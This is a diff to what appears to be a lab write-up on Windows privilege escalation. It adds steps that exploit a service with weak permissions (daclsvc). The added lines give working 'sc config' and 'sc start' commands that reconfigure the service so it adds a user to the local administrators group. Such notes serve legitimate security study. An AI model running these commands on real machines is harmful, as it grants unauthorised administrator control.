@@ -23,6 +23,13 @@ HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:
    ![Service(BIn_Path)](https://user-images.githubusercontent.com/55708909/92556310-390ecf00-f287-11ea-8a85-1af55670e7aa.png)
 
           You will see that everyone has read and write permission to change SERVICE_CHANGE_CONFIG
+          
+          Write this: sc config daclsvc binPath= "net localgroup administrators user /add"
+          
+          Then write this : sc start daclsvc 
+          
+          You will be added to admin group 
+
 
 
 2- Services (Unquoted path):
